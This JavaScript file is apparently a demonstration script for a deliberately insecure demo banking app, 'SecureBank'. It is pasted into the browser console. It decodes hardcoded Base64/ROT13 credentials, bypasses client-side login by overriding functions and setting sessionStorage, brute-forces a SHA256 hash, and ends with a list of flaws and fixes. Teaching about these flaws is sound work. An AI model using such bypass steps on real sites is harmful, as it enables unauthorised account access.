/*
Browser Console Demonstration Script
Copy and paste these commands into your browser's developer console
to demonstrate various bypass techniques

INSTRUCTIONS:
1. Open the SecureBank application in your browser
2. Press F12 to open Developer Tools
3. Go to the Console tab
4. Copy and paste the commands below one by one
*/

console.log("🔍 SecureBank Security Analysis Demo");
console.log("=====================================");

// 1. CREDENTIAL EXTRACTION
console.log("\n1. 📋 EXTRACTING HARDCODED CREDENTIALS");
console.log("--------------------------------------");

// Decode Base64 credentials
console.log("Base64 Decoding:");
console.log("admin =", atob('YWRtaW4='));
console.log("password123 =", atob('cGFzc3dvcmQxMjM='));
console.log("user =", atob('dXNlcg=='));
console.log("mysecret =", atob('bXlzZWNyZXQ='));

// Test ROT13 function
console.log("\nROT13 Decoding:");
function rot13(str) {
    return str.replace(/[a-zA-Z]/g, function(c) {
        return String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
    });
}
console.log("password123 =", rot13('cnffjbeq123'));
console.log("mysecret =", rot13('zlfrperg'));

// 2. AUTHENTICATION BYPASS METHODS
console.log("\n2. 🔓 AUTHENTICATION BYPASS TECHNIQUES");
console.log("--------------------------------------");

// Method 1: Function Override
console.log("Method 1: Override validateCredentials function");
console.log("Execute: validateCredentials = function() { return {valid: true, role: 'admin', message: 'Bypassed!'}; }");

// Method 2: Session Manipulation
console.log("\nMethod 2: Direct session manipulation");
console.log("Execute these commands:");
console.log("sessionStorage.setItem('authenticated', 'true');");
console.log("sessionStorage.setItem('username', 'hacker');");
console.log("sessionStorage.setItem('role', 'admin');");
console.log("location.reload(); // Refresh to see dashboard");

// Method 3: Form Bypass
console.log("\nMethod 3: Form submission bypass");
console.log("Execute: document.querySelector('.login-box').style.display = 'none';");
console.log("Execute: document.getElementById('dashboard').style.display = 'block';");

// 3. HASH CRACKING DEMONSTRATION
console.log("\n3. 🔨 HASH CRACKING DEMO");
console.log("------------------------");
console.log("Expected hash: 0b14d501a594442a01c6859541bcb3e8164d183d32937b851835442f69d5c94e");

// Test common passwords
const commonPasswords = ['hello123', 'password', 'admin', '123456', 'secret'];
console.log("Testing common passwords:");
commonPasswords.forEach(pwd => {
    const hash = CryptoJS.SHA256(pwd).toString();
    const match = hash === '0b14d501a594442a01c6859541bcb3e8164d183d32937b851835442f69d5c94e';
    console.log(`${pwd}: ${hash} ${match ? '✅ MATCH!' : '❌'}`);
});

// 4. INTERACTIVE BYPASS FUNCTIONS
console.log("\n4. 🎮 INTERACTIVE BYPASS FUNCTIONS");
console.log("----------------------------------");

// Create bypass functions for easy use
window.bypassAuth = function() {
    console.log("🔓 Bypassing authentication...");
    sessionStorage.setItem('authenticated', 'true');
    sessionStorage.setItem('username', 'bypassed_user');
    sessionStorage.setItem('role', 'admin');
    document.querySelector('.login-box').style.display = 'none';
    document.getElementById('dashboard').style.display = 'block';
    console.log("✅ Authentication bypassed! Dashboard should now be visible.");
};

window.resetAuth = function() {
    console.log("🔄 Resetting authentication...");
    sessionStorage.clear();
    document.querySelector('.login-box').style.display = 'block';
    document.getElementById('dashboard').style.display = 'none';
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
    console.log("✅ Authentication reset! Back to login page.");
};

window.showCredentials = function() {
    console.log("📋 Valid Credentials:");
    console.log("1. admin / password123");
    console.log("2. user / mysecret");
    console.log("3. secure_user / hello123");
    console.log("\nTry logging in with any of these combinations!");
};

// 5. SECURITY ANALYSIS FUNCTIONS
window.analyzeSecurityFlaws = function() {
    console.log("🔍 SECURITY ANALYSIS RESULTS");
    console.log("============================");
    
    const flaws = [
        "❌ Client-side authentication only",
        "❌ Hardcoded credentials in JavaScript",
        "❌ Weak obfuscation (Base64, ROT13)",
        "❌ No server-side validation",
        "❌ Session stored in localStorage",
        "❌ No rate limiting or account lockouts",
        "❌ Credentials visible in source code",
        "❌ No CSRF protection",
        "❌ No input validation",
        "❌ Debug functions exposed"
    ];
    
    flaws.forEach(flaw => console.log(flaw));
    
    console.log("\n✅ RECOMMENDED FIXES:");
    const fixes = [
        "✅ Implement server-side authentication",
        "✅ Use secure session tokens",
        "✅ Never store credentials client-side",
        "✅ Implement proper input validation",
        "✅ Add rate limiting and account lockouts",
        "✅ Use HTTPS for all requests",
        "✅ Implement CSRF protection",
        "✅ Remove debug functions in production"
    ];
    
    fixes.forEach(fix => console.log(fix));
};

// Display available functions
console.log("\n🎯 AVAILABLE DEMO FUNCTIONS:");
console.log("============================");
console.log("bypassAuth()        - Instantly bypass authentication");
console.log("resetAuth()         - Reset to login page");
console.log("showCredentials()   - Display valid login credentials");
console.log("analyzeSecurityFlaws() - Show security analysis");

console.log("\n🚀 Ready for security testing!");
console.log("Try calling any of the functions above, or manually test the credentials:");
console.log("admin/password123, user/mysecret, secure_user/hello123");
